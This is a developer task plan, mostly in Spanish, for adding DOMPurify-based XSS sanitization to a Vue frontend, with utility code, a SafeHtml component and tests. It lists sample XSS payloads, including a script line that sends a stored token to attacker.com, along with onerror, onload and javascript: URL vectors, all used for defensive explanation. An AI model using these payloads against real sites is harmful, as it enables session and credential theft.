# P2-3: XSS Protection
## Prevenir Cross-Site Scripting en User Content

**Status:** ⏳ No Iniciado
**Prioridad:** 🟡 MEDIA
**Impacto:** Security against code injection
**Complejidad:** 🟢 Bajo (2 horas)
**Location:** `packages/app/src/utils/sanitize.ts` + Vue components (FRONTEND)

---

## 📋 El Problema

### Vulnerabilidad

**Ubicación:** Cualquier lugar donde se renderiza user input (comments, descriptions, etc)

**Problema:** Si un usuario introduce código malicioso en un campo:
```html
<!-- User input en comment field: -->
<img src=x onerror="alert('hacked!')">

<!-- Si app renderiza sin sanitization: -->
<!-- Hacked! El script corre en el browser -->
```

### Escenarios XSS

```
Escenario 1: Comment XSS
1. User A escribe comment:
   <img src=x onerror="stealCookie()">
2. App renderiza sin sanitize
3. User B abre el PR
4. Script corre en el navegador de User B
5. Cookie robada, token, datos personales

Escenario 2: HTML Injection
1. User escribe en description:
   <script>fetch('http://attacker.com/steal?data=' + localStorage.token)</script>
2. Renderiza sin sanitize
3. Script corre, token enviado a attacker

Escenario 3: Event Handler XSS
1. User input:
   <div onclick="alert(document.cookie)">Click me</div>
2. Any user clicking → hacked
```

### Impacto

```
Sin XSS Protection:
- Token theft
- Session hijacking
- Malware distribution
- Account takeover
- Data theft
- Reputation damage

Con XSS Protection:
- User input sanitized
- Safe HTML rendering
- Scripts removed
- Events removed
- Data safe
```

---

## 🎯 Solución: DOMPurify Sanitization

### Arquitectura

```
User Input (untrusted)
    │
    ▼
┌──────────────────────────────┐
│ DOMPurify.sanitize()         │
├─ Remove all scripts          │
├─ Remove all event handlers   │
├─ Remove dangerous attributes │
├─ Keep safe HTML tags        │
└─ Return clean HTML           │
    │
    ▼
Safe HTML String
    │
    ▼
v-html directive (Vue)
    │
    ▼
DOM rendered (safe)
```

### Qué se Permite vs Se Bloquea

```
PERMITIDO (safe tags):
✓ <p>, <div>, <span>
✓ <b>, <i>, <u>, <strong>, <em>
✓ <h1-h6>, <hr>, <br>
✓ <ul>, <ol>, <li>
✓ <a> (pero sin onclick, etc)
✓ <img> (pero verificado)
✓ <code>, <pre>

BLOQUEADO (dangerous):
✗ <script> - ejecuta código
✗ onclick, onmouseover, etc - event handlers
✗ onerror en <img> - code execution
✗ <iframe> - pode cargar untrusted content
✗ <object>, <embed> - plugin execution
✗ javascript: URLs
✗ data: URIs (unless images)
```

---

## 🔧 Implementación (Frontend)

### PASO 1: Install DOMPurify

```bash
npm install dompurify
npm install -D @types/dompurify
```

### PASO 2: Create Sanitize Utility

**Archivo:** `packages/app/src/utils/sanitize.ts`

```typescript
import DOMPurify from 'dompurify';

/**
 * Sanitize HTML content to prevent XSS attacks
 * Removes scripts, event handlers, and dangerous attributes
 * while keeping safe HTML structure
 */
export function sanitizeHtml(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    // Allow specific safe tags
    ALLOWED_TAGS: [
      'p',
      'div',
      'span',
      'br',
      'hr',
      'h1',
      'h2',
      'h3',
      'h4',
      'h5',
      'h6',
      'b',
      'i',
      'u',
      'em',
      'strong',
      'a',
      'ul',
      'ol',
      'li',
      'code',
      'pre',
      'img',
      'blockquote',
    ],
    // Allow specific safe attributes
    ALLOWED_ATTR: [
      'href',      // for <a> tags
      'src',       // for <img> tags
      'alt',       // for <img> alt text
      'title',     // for tooltips
      'class',     // for styling (controlled)
      'id',        // for linking
      'style',     // limited CSS
    ],
    // Block dangerous protocols
    ALLOWED_URI_REGEXP:
      /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|blob):|[^a-z]|[a-z+.\-]*(?:[^a-z+.\-:]|$))/i,
  });
}

/**
 * Sanitize plain text (remove all HTML)
 * Use when you want to allow text only
 */
export function sanitizeText(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [], // No tags allowed
    ALLOWED_ATTR: [], // No attributes
  });
}

/**
 * Check if content has been modified by sanitization
 * Useful for warnings if content was changed
 */
export function wasSanitized(original: string, sanitized: string): boolean {
  return original !== sanitized;
}
```

---

### PASO 3: Create Safe HTML Component

**Archivo:** `packages/app/src/components/SafeHtml.vue`

```vue
<template>
  <div :class="['safe-html', className]">
    <!-- eslint-disable-next-line vue/no-v-html -->
    <div v-html="sanitizedContent" />
  </div>
</template>

<script setup lang="ts">
import { computed } from 'vue';
import { sanitizeHtml, wasSanitized } from '@/utils/sanitize';

interface Props {
  /**
   * Raw HTML content (potentially untrusted)
   * Will be sanitized before rendering
   */
  content: string;
  /**
   * CSS class name to apply to wrapper
   */
  className?: string;
  /**
   * Emit warning if content was sanitized
   */
  onSanitized?: (wasSanitized: boolean) => void;
}

const props = withDefaults(defineProps<Props>(), {
  className: '',
});

const sanitizedContent = computed(() => {
  const sanitized = sanitizeHtml(props.content);
  const changed = wasSanitized(props.content, sanitized);
  if (changed && props.onSanitized) {
    props.onSanitized(true);
  }
  return sanitized;
});
</script>

<style scoped>
.safe-html {
  /* Styling for sanitized content */
  word-wrap: break-word;
  overflow-wrap: break-word;
}

/* Prevent accidental overflow */
.safe-html :deep(img) {
  max-width: 100%;
  height: auto;
}

.safe-html :deep(a) {
  color: #0ea5e9;
  text-decoration: underline;
}

.safe-html :deep(code) {
  background-color: #f3f4f6;
  padding: 0.2em 0.4em;
  border-radius: 3px;
  font-family: 'Courier New', monospace;
}

.safe-html :deep(pre) {
  background-color: #1f2937;
  color: #f3f4f6;
  padding: 1em;
  border-radius: 6px;
  overflow-x: auto;
}
</style>
```

---

### PASO 4: Use in Components

**Everywhere user content is rendered:**

```vue
<!-- ❌ BEFORE (vulnerable to XSS) -->
<template>
  <div v-html="userComment"></div>
  <!-- If userComment = "<img src=x onerror='alert(1)'>"
       Script runs! -->
</template>

<!-- ✅ AFTER (safe) -->
<template>
  <SafeHtml :content="userComment" />
  <!-- Script removed, content safe -->
</template>

<script setup lang="ts">
import SafeHtml from '@/components/SafeHtml.vue';

const userComment = ref('<img src=x onerror="alert(1)">');
// Renders as: <img> (without onerror)
</script>
```

---

### PASO 5: Sanitize in Forms

**For user input fields:**

```vue
<template>
  <form @submit.prevent="submitComment">
    <textarea
      v-model="commentText"
      placeholder="Write a comment..."
    />
    <button type="submit">Post</button>
  </form>
</template>

<script setup lang="ts">
import { ref } from 'vue';
import { sanitizeText } from '@/utils/sanitize';

const commentText = ref('');

async function submitComment() {
  // Sanitize before sending to backend
  const clean = sanitizeText(commentText.value);

  const response = await fetch('/api/comments', {
    method: 'POST',
    body: JSON.stringify({ content: clean }),
  });

  // Backend should ALSO sanitize (defense in depth)
}
</script>
```

---

## 🧪 Testing

### Manual Test

```typescript
// Test 1: Script injection
const malicious = '<img src=x onerror="alert(\'hacked\')">';
const clean = sanitizeHtml(malicious);
// Result: <img src="x"> (onerror removed)

// Test 2: Event handlers
const input = '<div onclick="stealData()">Click</div>';
const output = sanitizeHtml(input);
// Result: <div>Click</div> (onclick removed)

// Test 3: Safe HTML preserved
const safe = '<p>Hello <strong>world</strong></p>';
const result = sanitizeHtml(safe);
// Result: <p>Hello <strong>world</strong></p> (unchanged)
```

### Automated Test

```typescript
describe('SafeHtml Component', () => {
  it('should remove script tags', () => {
    const malicious = '<script>alert("xss")</script><p>Hello</p>';
    const { getByText } = render(SafeHtml, {
      props: { content: malicious },
    });
    expect(getByText('Hello')).toBeTruthy();
    // Script should not be in DOM
  });

  it('should remove event handlers', () => {
    const malicious = '<button onclick="hack()">Click</button>';
    const { container } = render(SafeHtml, {
      props: { content: malicious },
    });
    const button = container.querySelector('button');
    expect(button?.onclick).toBe(null); // onclick removed
  });

  it('should preserve safe HTML', () => {
    const safe = '<p>Hello <b>world</b></p>';
    const { getByText } = render(SafeHtml, {
      props: { content: safe },
    });
    expect(getByText('world')).toBeTruthy();
    expect(getByText('world').parentElement?.tagName).toBe('B');
  });

  it('should warn when content is sanitized', () => {
    const malicious = '<script>alert(1)</script>';
    const onSanitized = jest.fn();
    render(SafeHtml, {
      props: { content: malicious, onSanitized },
    });
    expect(onSanitized).toHaveBeenCalledWith(true);
  });
});
```

---

## ✅ Checklist

- [ ] Install DOMPurify
- [ ] Create sanitize.ts utility
- [ ] Create SafeHtml.vue component
- [ ] Replace all v-html with SafeHtml
- [ ] Sanitize user input in forms
- [ ] Test script injection scenarios
- [ ] Test event handler removal
- [ ] Test safe HTML preservation
- [ ] Unit tests for sanitize function
- [ ] Unit tests for SafeHtml component
- [ ] Test warnings on sanitization

---

## 📈 Métricas de Éxito

✅ **Safe**: Scripts cannot execute
✅ **Complete**: All user content sanitized
✅ **Transparent**: Safe component looks same
✅ **Testable**: Clear test cases for XSS
✅ **Logged**: Warns when content changed

---

## 🔐 Defense in Depth

Note: Sanitization should happen at BOTH layers:

```
Frontend (App):
├─ v-html → SafeHtml (prevents rendering)
└─ Form input → sanitizeText (prevents sending)

Backend:
├─ Zod schemas (input validation)
├─ sanitizeHtml() on storage (if applicable)
└─ Database parameterized queries (prevents SQL injection)
```

Both layers are needed for complete security!

---

## Common XSS Vectors This Prevents

```
Vector 1: Script tag
<script>alert('xss')</script>
→ BLOCKED: <script> removed

Vector 2: Image onerror
<img src=x onerror=alert(1)>
→ BLOCKED: onerror removed

Vector 3: SVG onload
<svg onload=alert(1)>
→ BLOCKED: <svg> tag not allowed

Vector 4: Event handler
<div onclick=alert(1)>
→ BLOCKED: onclick removed

Vector 5: JavaScript URL
<a href="javascript:alert(1)">
→ BLOCKED: javascript: protocol not allowed

Vector 6: Data URI
<img src="data:text/html,<script>...">
→ BLOCKED: data: URIs restricted

Vector 7: HTML Entity Encoding
&#60;script&#62;alert(1)&#60;/script&#62;
→ DECODED and BLOCKED: Converted to <script> then removed
```

---

**Implementación próxima:** Después de Plan Review
